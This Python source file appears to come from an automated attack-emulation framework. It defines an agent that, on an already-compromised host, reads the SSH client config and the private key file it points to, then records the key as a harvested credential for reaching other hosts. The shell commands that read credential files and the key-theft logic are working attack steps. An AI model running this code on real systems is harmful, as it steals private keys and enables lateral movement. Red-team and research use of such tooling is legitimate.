from incalmo.core.models import Credential
from incalmo.core.actions.low_level import CommandRunner
from .base_agent import BaseAgent


class FindInfoAgent(BaseAgent):
    """
    FindInformation task agent.

    Runs on an already-compromised host (via a CommandRunner that can execute
    commands there) and looks for SSH credentials the way an attacker would:
    read the SSH client config to learn where a key opens, then read the key
    file. Any credential found is written into the environment state service.
    """

    def run(self, runner: CommandRunner, found_on_host: str) -> dict:
        # 1. Read the SSH client config to discover target host / user / key path.
        config_text = runner.run("cat ~/.ssh/config")
        target_host = self._field(config_text, "HostName")
        target_user = self._field(config_text, "User")
        key_path = self._field(config_text, "IdentityFile") or "~/.ssh/id_rsa"

        # 2. Read the private key file the config points to.
        private_key = runner.run(f"cat {key_path}")

        if not private_key or "PRIVATE KEY" not in private_key:
            return self._failure(
                f"No SSH private key found on {found_on_host}",
                {"config": config_text},
            )

        # 3. Record the credential in the environment state service.
        cred = Credential(
            username=target_user or "unknown",
            ssh_key=private_key,
            found_on_host=found_on_host,
            found_at_path=key_path,
            can_access_hosts=[target_host] if target_host else [],
        )
        self.env_service.add_credential(cred)

        return self._success(
            f"Found SSH key for {target_user}@{target_host} on {found_on_host}",
            {"username": target_user, "can_access": target_host, "found_at": key_path},
        )

    def _field(self, config_text: str, name: str) -> str:
        """Pull a value out of an ssh_config line like '    HostName 192.168.1.100'."""
        for line in config_text.splitlines():
            parts = line.split()
            if len(parts) >= 2 and parts[0].lower() == name.lower():
                return parts[1]
        return ""